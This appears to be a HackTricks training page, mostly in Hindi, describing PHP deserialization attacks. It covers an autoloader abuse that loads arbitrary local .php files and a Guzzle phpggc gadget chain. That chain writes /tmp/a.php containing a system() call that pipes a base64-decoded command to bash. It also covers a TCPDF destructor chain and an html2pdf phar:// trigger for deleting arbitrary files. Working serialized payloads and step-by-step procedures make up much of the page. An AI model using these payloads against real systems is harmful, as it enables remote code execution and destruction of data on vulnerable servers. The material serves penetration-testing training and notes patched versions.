# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

सबसे पहले, आपको यह देखना चाहिए कि [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php) क्या हैं।

## PHP deserialization + spl_autoload_register + LFI/Gadget

हम ऐसी स्थिति में थे जहाँ हमें किसी webapp में **PHP deserialization** मिला था और वर्तमान ऐप कोड में **`phpggc`** के अंदर gadget के लिए **कोई लाइब्रेरी नहीं थी**। हालांकि, उसी container में एक **अलग composer webapp जिसमें vulnerable libraries थीं** मौजूद थी। इसलिए उद्देश्य यह था कि दूसरी webapp का **composer loader लोड करके** उसे बदइस्तेमाल किया जाए ताकि वह उस लाइब्रेरी को exploit करने वाला **gadget लोड कर सके**, जो deserialization के लिए vulnerable webapp में मौजूद था।

Steps:

- आपने एक **deserialization** पाया है और वर्तमान app कोड में **कोई gadget नहीं है**
- आप निम्न जैसा **`spl_autoload_register`** फ़ंक्शन दुर्व्यवहार कर सकते हैं ताकि **किसी भी local file with `.php` extension`** लोड हो सके
- इसके लिए आप ऐसी deserialization का उपयोग करेंगे जहाँ क्लास का नाम **`$name`** के अंदर जाएगा। serialized object में क्लास नाम में आप **"/" या "."** उपयोग नहीं कर सकते, लेकिन **code** **underscores** ("\_") को **slashes** ("/") से बदल रहा है। इसलिए `tmp_passwd` जैसे क्लास नाम को `/tmp/passwd.php` में बदल दिया जाएगा और code इसे लोड करने की कोशिश करेगा.\ A **gadget example** will be: **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
> [!TIP]
> यदि आपके पास एक **file upload** है और आप **`.php` extension`** वाली फ़ाइल अपलोड कर सकते हैं तो आप इस फ़ंक्शनैलिटी का सीधे **abuse** कर सकते हैं और पहले से ही RCE प्राप्त कर सकते हैं।

In my case, I didn’t have anything like that, but there was inside the **same container** another composer web page with a **library vulnerable to a `phpggc` gadget**.

- To load this other library, first you need to **load the composer loader of that other web app** (because the one of the current application won’t access the libraries of the other one.) **Knowing the path of the application**, you can achieve this very easily with: **`O:28:"www_frontend_vendor_autoload":0:{}`** (In my case, the composer loader was in `/www/frontend/vendor/autoload.php`)
- Now, you can **load** the others **app composer loader**, so it’s time to **`generate the phpgcc`** **payload** to use. In my case, I used **`Guzzle/FW1`**, which allowed me to **write any file inside the filesystem**.
- NOTE: The **generated gadget was not working**, in order for it to work I **modified** that payload **`chain.php`** of phpggc and set **all the attribute**s of the classes **from private to public**. If not, after deserializing the string, the attributes of the created objects didn’t have any values.
- Now we have the way to **load the others app composer loader** and have a **phpggc payload that works**, but we need to **do this in the SAME REQUEST for the loader to be loaded when the gadget is used**. For that, I sent a serialized array with both objects like:
- You can see **first the loader being loaded and then the payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- अब, हम **create and write a file** कर सकते हैं, हालांकि user **couldn’t write in any folder inside the web server**. इसलिए, जैसा कि आप payload में देख सकते हैं, PHP जो **`system`** को कुछ **base64** के साथ कॉल कर रहा है वह **`/tmp/a.php`** में बनाया गया है। फिर, हम पहले प्रकार के payload को **reuse** कर सकते हैं जिसे हमने LFI के रूप में उपयोग किया था ताकि दूसरे webapp के composer loader को लोड करके जनरेट किए गए `/tmp/a.php` फाइल को लोड किया जा सके। बस इसे deserialization gadget में जोड़ दें:
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
**payload का सारांश**

- **Load the composer autoload** उसी container में मौजूद किसी दूसरे webapp का
- **Load a phpggc gadget** ताकि दूसरे webapp की library का दुरुपयोग किया जा सके (the initial webapp vulnerable to deserialization की libraries में कोई gadget नहीं था)
- गैजेट `/tmp/a.php` में एक PHP payload वाली फ़ाइल बनाएगा जिस पर malicious commands होंगे (webapp user किसी भी webapp के किसी भी फ़ोल्डर में लिख नहीं सकता)
- हमारे payload का अंतिम हिस्सा generated php file को load करेगा जो कमांड्स execute करेगा

मुझे इस deserialization को **दो बार कॉल** करना पड़ा। मेरे परीक्षण में, पहली बार `/tmp/a.php` फ़ाइल बनाई गई लेकिन लोड नहीं हुई, और दूसरी बार यह सही तरीके से लोड हुई।

## TCPDF `__destruct` POP chain for arbitrary file deletion

जब एक वास्तविक `TCPDF` instance garbage-collected होता है, तो यह `_destroy(true)` को कॉल करता है, `$this->imagekeys` पर iterate करता है, और `K_PATH_CACHE` के अंतर्गत किसी भी चीज़ को जो cache फ़ाइल जैसा दिखती है उसे `unlink()` कर देता है। यदि कोई application `TCPDF` class लोड होने के दौरान `unserialize($user_data)` करता है (उदा. यह `html` key के साथ एक array की उम्मीद करता है), तो आप एक serialized object प्रदान कर सकते हैं जो सेट करता है:

- `file_id` को किसी भी integer पर सेट करें जो `self::$cleaned_ids` में मौजूद न हो (उदा. `-1`)।
- `imagekeys` को ऐसे paths पर सेट करें जो `K_PATH_CACHE` से शुरू होते हों या जिन्हें ऐसा दिखने के लिए बनाया जा सके (उदा. `/tmp/../tmp/do_not_delete_this_file.txt` जब `K_PATH_CACHE` `/tmp/` हो)।

Example payload hitting an unsafe `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
The file is deleted as soon as the object falls out of scope. TCPDF 6.9.3 tightened the check to only remove paths with the `__tcpdf_<file_id>_` prefix inside `K_PATH_CACHE` and introduced `_unlink()` to block non-`file://` schemes, so older `Producer` versions are prime targets.

### html2pdf के `<cert>` टैग में `phar://` के माध्यम से गैजेट को ट्रिगर करना

`spipu/html2pdf` (≤5.3.0) TCPDF को wrap करता है और एक कस्टम `<cert>` ब्लॉक एक्सपोज़ करता है जिसके `src`/`privkey` attributes को साधारण `file_exists()` से validate किया जाता है। PHP < 8.0 पर कोई भी filesystem function जो `phar://` URL को टच करता है वह Phar metadata को unserialize करवा देता है। ऊपर बताए हुए malicious TCPDF ऑब्जेक्ट को Phar archive की metadata में रखकर आप एक reliable POP हासिल कर सकते हैं भले ही application स्वयं कभी `unserialize()` न बुलाए।

1. `phar.readonly=0` के साथ एक Phar बनाइए, stub/manifest को image जैसा दिखने के लिए सेट कीजिए (उदा. `archive.phar` को `archive.png` में rename करें), और serialized TCPDF ऑब्जेक्ट को Phar metadata में स्टोर करें।
2. फ़ाइल को किसी पहुँच योग्य जगह पर अपलोड/रखें, जैसे `/tmp/user_files/user_1/archive.png`।
3. ऐसा HTML सबमिट करें जिसमें `<cert>` टैग हो ताकि html2pdf हमलावर-नियंत्रित पथ को resolve करे:
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
`file_exists()` कॉल मेटाडेटा को डिसिरियलाइज़ करता है, TCPDF को instantiate करता है, और इसका destructor चुनी हुई फ़ाइल को हटा देता है, जिससे html2pdf एक शक्तिशाली `phar://` एंट्री पॉइंट बन जाता है। Version 5.3.1 ने अप्रूव्ड schemes को ब्लॉक करने के लिए `Security::checkValidPath()` जोड़ा, इसलिए legacy deployments अभी भी आकर्षक बने रहते हैं।

## संदर्भ

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)

{{#include ../../banners/hacktricks-training.md}}
